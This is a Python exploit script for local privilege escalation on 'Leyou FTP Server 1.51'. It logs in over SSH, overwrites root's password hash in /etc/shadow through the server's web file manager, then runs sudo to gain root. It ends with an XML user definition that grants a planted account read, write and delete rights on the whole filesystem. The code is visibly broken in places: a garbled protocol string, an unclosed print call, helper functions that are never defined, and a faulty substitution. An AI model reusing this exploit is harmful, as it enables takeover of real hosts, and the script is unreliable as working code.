#!/dd01xc/bin/python3

import paramiko, sys, warnings, requests, re, time, argparse

warnings.filterwarnings("ignore")

parser = argparse.ArgumentParser(description="Exploit for Leyou FTP Server 1.51 Local Privilege Escalation",
                                 epilog=print(f"Exploit by @dd01xc."))
parser.add_argument("-t", "--target", help="hostname of target, optionally with port specified (hostname:port)",
                    required=True)
parser.add_argument("-u", "--username", help="SSH username", required=True)
parser.add_argument("-p", "--password", help="SSH password", required=True)
parser.add_argument("-v", "--verbose", help="Turn on debug information", action='store_true')
parser.add_argument("--proxy", help="Send HTTP through a proxy", default=False)
args = parser.parse_args()

username = args.username
password = args.password

if args.verbose:
    DEBUG = True
else:
    DEBUG = False

if ':' in args.target:
    socket = args.target.split(':')
    hostname = socket[0]
    port = socket[1]
else:
    hostname = args.target
    port = "22"

if args.proxy:
    if ("http://" not in args.proxy) and ("https://" not in args.proxy):
        print(f"[!] Invalid proxy. Proxy must have http:// or https:// {args.proxy}")
        sys.exit(1)
    proxies = {'http': args.proxy, 'https': args.proxy}
else:
    proxies = {}

def log(string):
    if DEBUG:
        print(string)

def checkHTTP(hostname):
    protocols = ["http://", "ps:htt//"]
    for protocol in protocols:
        try:
            log(f"Testing HTTP service {protocol}{hostname}")
            response = requests.get(protocol + hostname, verify=False, proxies=proxies)
            try:
                if "Leyou FTP Server" in response.headers['Server']:
                    print(f"[!] Leyou FTP Server found at {protocol}{hostname}")
                    url = protocol + hostname
            except:
                print("")
        except Exception as e:
            print(f"[*] Server is not running Leyou FTP web services on {protocol}: {e}"
    return url

def overwriteShadow(url):
    log("overwriteShadow")
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    cookies = getCookie(url=url, webuser="h00p", webpass="h00p", headers=headers)
    directorymem = chDir(url=url, directory="etc", headers=headers, cookies=cookies, directorymem="")
    shadowfile, referer = downloadFile(file="shadow", url=url, headers=headers, cookies=cookies,
                                       directorymem=directorymem)
    rootpass = "$1$h00ph00p$0cUgaHnnAEvQcbS6PCMVM0"
    rootpass = "root:" + rootpass + ":18273:0:99999:7:::"
    newshadow = re.sub("root(.*):::", "root:" + rootpass + ":", shadowfile)
    print("[*] Swapped the password hash...")
    saveFile(newfilecontent=newshadow, file="shadow", url=url, headers=headers, cookies=cookies, referer=referer,
             directorymem=directorymem)
    print("[*] Saved the forged shadow file...")

def main():
    log("main")
    try:
        client = paramiko.SSHClient()
        client.load_system_host_keys()
        client.set_missing_host_key_policy(paramiko.WarningPolicy)
        client.connect(hostname, username=username, password=password, port=port)
        print(f"[+] SSH login successful to {hostname}:{port} using {username}/{password}")

        overwriteShadow(url=f"http://{hostname}")

        commands = [
            "sudo su -",
            "cat /etc/passwd",
            "whoami",
        ]

        for command in commands:
            stdin, stdout, stderr = client.exec_command(command)
            print(f"[*] Executing command: {command}")
            print(stdout.read().decode())

    except paramiko.AuthenticationException as e:
        print(f"[-] Authentication failed: {e}")
    except paramiko.SSHException as e:
        print(f"[-] SSH error: {e}")
    except Exception as e:
        print(f"[-] General error: {e}")
    finally:
        if 'client' in locals():
            client.close()
            print("[*] SSH connection closed")

if __name__ == "__main__":
    main()


evilUserXML = """<?xml version="1.0" ?>
<USER_ACCOUNTS Description="Leyou FTP Server User Accounts">
    <USER>
        <UserName>h00p</UserName>
        <EnableAccount>1</EnableAccount>
        <EnablePassword>1</EnablePassword>
        <Password>d28f47c0483d392ca2713fe7e6f54089</Password>
        <ProtocolType>63</ProtocolType>
        <EnableExpire>0</EnableExpire>
        <ExpireTime>2020-02-25 18:27:07</ExpireTime>
        <MaxDownloadSpeedPerSession>0</MaxDownloadSpeedPerSession>
        <MaxUploadSpeedPerSession>0</MaxUploadSpeedPerSession>
        <MaxDownloadSpeedPerUser>0</MaxDownloadSpeedPerUser>
        <MaxUploadSpeedPerUser>0</MaxUploadSpeedPerUser>
        <SessionNoCommandTimeOut>5</SessionNoCommandTimeOut>
        <SessionNoTransferTimeOut>5</SessionNoTransferTimeOut>
        <MaxConnection>0</MaxConnection>
        <ConnectionPerIp>0</ConnectionPerIp>
        <PasswordLength>0</PasswordLength>
        <ShowHiddenFile>0</ShowHiddenFile>
        <CanChangePassword>0</CanChangePassword>
        <CanSendMessageToServer>0</CanSendMessageToServer>
        <EnableSSHPublicKeyAuth>0</EnableSSHPublicKeyAuth>
        <SSHPublicKeyPath></SSHPublicKeyPath>
        <SSHAuthMethod>0</SSHAuthMethod>
        <EnableWeblink>1</EnableWeblink>
        <EnableUplink>1</EnableUplink>
        <CurrentCredit>0</CurrentCredit>
        <RatioDownload>1</RatioDownload>
        <RatioUpload>1</RatioUpload>
        <RatioCountMethod>0</RatioCountMethod>
        <EnableRatio>0</EnableRatio>
        <MaxQuota>0</MaxQuota>
        <CurrentQuota>0</CurrentQuota>
        <EnableQuota>0</EnableQuota>
        <NotesName></NotesName>
        <NotesAddress></NotesAddress>
        <NotesZipCode></NotesZipCode>
        <NotesPhone></NotesPhone>
        <NotesFax></NotesFax>
        <NotesEmail></NotesEmail>
        <NotesMemo></NotesMemo>
        <EnableUploadLimit>0</EnableUploadLimit>
        <CurLimitUploadSize>0</CurLimitUploadSize>
        <MaxLimitUploadSize>0</MaxLimitUploadSize>
        <EnableDownloadLimit>0</EnableDownloadLimit>
        <CurLimitDownloadLimit>0</CurLimitDownloadLimit>
        <MaxLimitDownloadLimit>0</MaxLimitDownloadLimit>
        <LimitResetType>0</LimitResetType>
        <LimitResetTime>1580092048</LimitResetTime>
        <TotalReceivedBytes>0</TotalReceivedBytes>
        <TotalSentBytes>0</TotalSentBytes>
        <LoginCount>0</LoginCount>
        <FileDownload>0</FileDownload>
        <FileUpload>0</FileUpload>
        <FailedDownload>0</FailedDownload>
        <FailedUpload>0</FailedUpload>
        <LastLoginIp></LastLoginIp>
        <LastLoginTime>2020-01-26 18:27:28</LastLoginTime>
        <EnableSchedule>0</EnableSchedule>
        <Folder>
            <Path>/</Path>
            <Alias>/</Alias>
            <Home_Dir>1</Home_Dir>
            <File_Read>1</File_Read>
            <File_Write>1</File_Write>
            <File_Append>1</File_Append>
            <File_Delete>1</File_Delete>
            <Directory_List>1</Directory_List>
            <Directory_Rename>1</Directory_Rename>
            <Directory_Make>1</Directory_Make>
            <Directory_Delete>1</Directory_Delete>
            <File_Rename>1</File_Rename>
            <Zip_File>1</Zip_File>
            <Unzip_File>1</Unzip_File>
        </Folder>
    </USER>
</USER_ACCOUNTS>
"""


